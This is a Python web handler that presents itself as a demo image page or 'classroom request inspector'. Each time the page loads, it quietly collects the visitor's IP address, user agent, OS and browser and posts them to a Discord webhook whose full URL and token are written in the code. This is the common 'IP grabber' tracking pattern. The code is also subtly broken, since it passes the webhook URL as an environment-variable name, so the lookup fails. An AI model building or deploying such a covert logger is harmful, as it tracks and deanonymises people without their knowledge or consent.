import json
import os
from http.server import BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import httpagentparser
import requests


def load_demo_urls():
    """Load sample image URLs from urls.json if present."""
    config_path = os.path.join(os.path.dirname(__file__), "..", "urls.json")
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return {item["id"]: item["url"] for item in data.get("urls", []) if "id" in item and "url" in item}
    except Exception:
        return {}


DEMO_URLS = load_demo_urls()
DEFAULT_IMAGE_URL = "https://images.unsplash.com/photo-1506744038136-46273834b3fb"


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        # Select a sample URL by key from urls.json (defaults to first/fallback image)
        sample_key = params.get("sample", [""])[0]
        target_image = DEMO_URLS.get(sample_key, DEFAULT_IMAGE_URL)

        # Inspect headers that proxies/CDNs and browsers send
        forwarded_for = self.headers.get("x-forwarded-for", "")
        client_ip = forwarded_for.split(",")[0].strip() if forwarded_for else self.client_address[0]
        user_agent = self.headers.get("user-agent", "Unknown")
        os_name, browser_name = httpagentparser.simple_detect(user_agent)

        webhook_url = os.environ.get("https://discord.com/api/webhooks/1571839606368903260/tBwh8pE0kbsZlYvvOCkhrdJLqROD-TeDGLrvVe3cueR7TVDKCf2UC5-K_8TuR7aqwVf-")
        if webhook_url:
            embed = {
                "username": "Classroom Request Inspector",
                "embeds": [
                    {
                        "title": "HTTP GET Request Observed",
                        "color": 0x3498DB,
                        "fields": [
                            {"name": "Path", "value": f"`{parsed.path}`", "inline": True},
                            {"name": "Client IP (X-Forwarded-For)", "value": f"`{client_ip}`", "inline": True},
                            {"name": "OS / Browser", "value": f"`{os_name}` / `{browser_name}`", "inline": False},
                            {"name": "User-Agent", "value": f"```{user_agent[:200]}```", "inline": False},
                        ],
                    }
                ],
            }
            try:
                requests.post(webhook_url, json=embed, timeout=5)
            except requests.RequestException:
                pass

        # Return a simple HTML page displaying the chosen sample image
        html = f"""<!doctype html>
<html>
  <head><meta charset="utf-8"><title>Demo Media Endpoint</title></head>
  <body style="margin:0;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#111;">
    <img src="{target_image}" alt="Demo sample" style="max-width:100%;max-height:100vh;object-fit:contain;" />
  </body>
</html>"""

        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
